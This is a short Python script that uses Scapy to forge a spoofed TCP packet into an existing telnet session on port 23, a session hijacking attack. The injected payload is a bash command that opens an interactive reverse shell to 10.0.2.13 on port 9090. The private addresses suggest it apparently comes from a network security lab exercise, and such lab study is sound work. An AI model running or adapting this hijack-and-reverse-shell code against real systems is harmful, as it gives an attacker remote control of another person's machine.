import sys
from scapy.all import *

ip = IP(src="10.0.2.16",dst="10.0.2.12")
tcp = TCP(sport=41524,dport=23,flags="A",seq=3390870544,ack=1615969376)
Data = "\r /bin/bash -i > /dev/tcp/10.0.2.13/9090 0<&1 2>&1\r"
pkt = ip/tcp/Data
ls(pkt)
send(pkt,verbose=0)
